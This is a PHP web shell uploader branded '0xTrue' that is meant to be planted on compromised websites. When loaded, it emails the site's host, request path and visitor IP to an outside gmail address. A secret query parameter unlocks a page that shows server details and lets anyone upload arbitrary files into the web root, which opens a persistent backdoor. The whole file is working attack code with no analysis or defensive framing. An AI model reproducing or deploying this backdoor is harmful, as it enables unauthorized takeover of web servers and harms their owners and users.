<?php
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = " 0xTrue Shell | $ra44";
$email = "eotnay@gmail.com";
$from = "From: 0xTrue@Groosec.com";
$b75 = $_SERVER['HTTP_HOST'];
$a45 = $_SERVER['REQUEST_URI'];
$m22 = $ip . "";
$msg8873 = "$m22 $b75 $a45";
mail($email, $subj98, $msg8873, $from);
?>
<?php
if($_GET['0xT'] == 'coeg') {
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link rel="SHORTCUT ICON" href="http://dsysna.comze.com/indo.png">
<link href="" rel="stylesheet" type="text/css">
<title>[!]0xTrue - Uploader[!]</title>
<style>
body{
font-family: "Racing Sans One", cursive;
background-color: #000000;
background-attachment: fixed;
color: red;
}
</style>
</HEAD>
<BODY>
<H1><center><font color="red">[!]<font color="white">0xTrue - Uploader<font color="red">[!]</font></font></font></center></H1>
<center><p style="color: red;">'.gethostbyname($_SERVER['HTTP_HOST']).'</p></center>
<center><p style="color: red;">'.php_uname().'</p>
<tr><td>Silahkan Upload om :D :</center><br>';
echo "<center><form method='post' enctype='multipart/form-data'>
      <input type='file' name='0xT'>
      <input type='submit' name='upload' value='upload'>
      </form></center><br>";
echo '<!DOCTYPE HTML>
<HTML>
<H1><center><font color="white">Hacker Indonesia</font></center></H1> <br> <center><font color="white">Copyright</font> &copy; <font color="red">2017 0xTrue</font></center>';
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['0xT']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
    if(is_writable($root)) {
        if(@copy($_FILES['0xT']['tmp_name'], $dest)) {
            $web = "http://".$_SERVER['HTTP_HOST']."/";
            echo "<center>Sukses Om -> <a href='$web$files' target='_blank'><b><u>$web$files</u></b></a></center>";
        } else {
            echo "<center>Gagal up :(</center>";
        }
    } else {
        if(@copy($_FILES['0xT']['tmp_name'], $files)) {
            echo "<center>sukses upload <b>$files</b> di folder ini</center>";
        } else {
            echo "<center>Gagal up :(</center>";
        }
    }
}
}
?>